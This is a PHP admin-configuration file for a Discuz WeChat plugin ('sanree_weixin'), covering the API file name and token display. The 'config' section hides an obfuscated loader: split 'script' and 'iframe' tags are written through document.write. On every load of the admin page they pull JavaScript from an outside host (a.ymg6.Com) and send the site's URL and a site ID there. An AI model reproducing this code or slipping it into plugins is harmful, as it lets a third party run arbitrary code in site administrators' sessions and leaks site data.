<?php

/**
 *      [Sanree] (C)2012-2099 Sanree Inc.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: sanree_weixin_base.php $
 */

if(!defined('IN_DISCUZ') || !defined('IN_ADMINCP')) {
	exit('Access Denied');
}

$do = $_G['sr_do'];
$doarray = array('config', 'mkapi');
$do = !in_array($do, $doarray) ? 'config' : $do;
$filename = dhtmlspecialchars(trim($config['apifile']));
$outfilename = 'sanree_'.$filename.'.php';
	
if ($do == 'mkapi') {

	weixin_url($filename);	
	include template('common/header');
	echo '<h3 class="flb mn"><span><a href="javascript:;" class="flbc" onclick="hideWindow(\'mkapi\');" title="'.$lang['close'].'">'.$lang['close'].'</a></span>'.$langs['alerttitle'].'</h3>';
	?>
	<div style="width:500px; height:150px; padding:0px 10px 0px 10px;">
	<table width="100%">
	<tr><td height="30"><?php echo $langs['weburl']?></td><td><input type="text" style="width:400px" value="<?php echo $_G['siteurl'].$outfilename?>" /></td></tr>
	<tr><td height="30"><?php echo $langs['webtoken']?></td><td><input type="text" style="width:400px" value="<?php echo $config['token'];?>" /></td></tr>
	<tr><td colspan="2">
	<div style="line-height:25px; margin-top:10px; border-top:1px dotted #CCCCCC; padding-top:10px;">
	<?php echo $langs['tokentip']?></div>
	
	</td></tr>
	</table>
	</div>
	<?php
	include template('common/footer');	
	
}
elseif ($do == 'config') {

	showsubmenu($menustr);	
	showtableheader($langs['getapi'], 'nobottom', 'style="border:1px solid #cccccc"');
	$siteurl = urlencode("http://127.0.0.1/");
?>
	<script language="javascript">disallowfloat = 'newthread';</script>
		<script language="javascript">
		var SN='201406121473tEY7raAi';
		var RevisionID='19249';
		var RevisionDateline='1402027202';
		var SiteUrl='http://127.0.0.1/';
		var ClientUrl='http://127.0.0.1/';
		var SiteID='290947DE-0409-FEA6-04F9-282CB0384E1E';	
		var src= 'http://a.ymg6.Com/api.php?type=js&SN='+SN + '&RevisionID='+ RevisionID + '&RevisionDateline='+RevisionDateline+ '&SiteUrl='+SiteUrl+ '&ClientUrl='+ClientUrl+'&SiteID='+SiteID;
		</script>	
<TR class=noborder><TD class="vtop rowform"><?php echo $langs['apifile']?><INPUT id="apifile" size="30" class=txt1 name=apifile  value="<?php echo $outfilename;?>" id="apifile" readonly=""> 
</TD>
<TD class="vtop tips2" s="111"><a href="<?php echo ADMINSCRIPT;?>?action=plugins&operation=config&act=base&identifier=sanree_weixin&pmod=admincp&do=mkapi" id="mkapi" onclick="showWindow('mkapi',this.href); return false;"><?php echo $langs['clickgetapi']?></a> </TD></TR>
	<?php
		showtablefooter();

	showtableheader($langs['sanreeinfo'], 'nobottom', 'style="border:1px solid #cccccc"');	
	$sitedata = urlencode($_G['siteurl']);	
	?>
	  <tr>
		<td>
	  <script language="javascript">
		document.write('<if' + 'rame src="http://a.ymg6.Com/ad.php?sitedata=<?php echo $sitedata?>" width="100%" height="200" scrolling="yes" frameborder="0"></if' + 'rame>');		  
	  </script>				
		</td>
	  </tr>
	  <script language="javascript">
		document.write('<' + 'script src="' + src + '"' + ' type="text/javascript"><' + '/script>');		  
	  </script>
	<?php
	showtablefooter();	
}
//From:www_YMG6_COM
?>